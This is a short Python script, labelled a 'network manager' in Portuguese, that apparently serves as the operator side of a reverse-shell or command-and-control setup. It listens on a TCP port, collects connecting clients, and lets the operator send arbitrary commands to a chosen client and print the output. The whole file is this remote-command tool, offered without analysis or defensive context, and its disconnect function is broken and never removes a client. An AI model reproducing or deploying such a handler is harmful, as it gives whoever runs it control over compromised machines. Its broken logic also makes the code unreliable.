from socket import *
from threading import *

clientes = []

def deletar_cliente(clientes):
    mostrar_clientes(clientes)
    id_cliente = int(input("[+] Escolha o cliente que deseja desconectar: "))
    socket_cliente = clientes[id_cliente][0]
    if socket_cliente in clientes:
        try:
            clientes.remove(socket_cliente)
            print("Cliente desconectado!")
        except:
            print("Impossivel remover cliente!")


def comando(clientes):
    mostrar_clientes(clientes)
    id_cliente = int(input("[+] Escolha o cliente:"))
    socket_cliente = clientes[id_cliente][0]
    comando_executar = input("[+] Comando a ser executado: ")
    socket_cliente.sendall(comando_executar.encode())
    resultado = socket_cliente.recv(2048).decode()
    print(resultado)

def mostrar_clientes(clientes):
    contador = 0
    for cliente in clientes:
        print(f"{contador} -> {cliente[1][0]}")
        contador += 1
def menu():
    print("""
    GERENCIADOR DE REDE
    -------------------
    1) Mostrar clientes
    2) Executar comandos
    3) Desconectar clientes
    -------------------
    """)
def gerenciador(servidor):
    while True:
        cliente, endereco = servidor.accept()
        clientes.append([cliente, endereco])

servidor = socket(AF_INET, SOCK_STREAM)
servidor.bind(("localhost", 2222))
servidor.listen(100)

t = Thread(target=gerenciador, args = [servidor])
t.start()

while True:
    menu()
    try:
        opcao = int(input("[+] Comando: "))
    except:
        print("Informe um comando valido.\n")
        continue

    if opcao == 1:
        mostrar_clientes(clientes)

    if opcao == 2:
        comando(clientes)

    if opcao == 3:
        deletar_cliente(clientes)


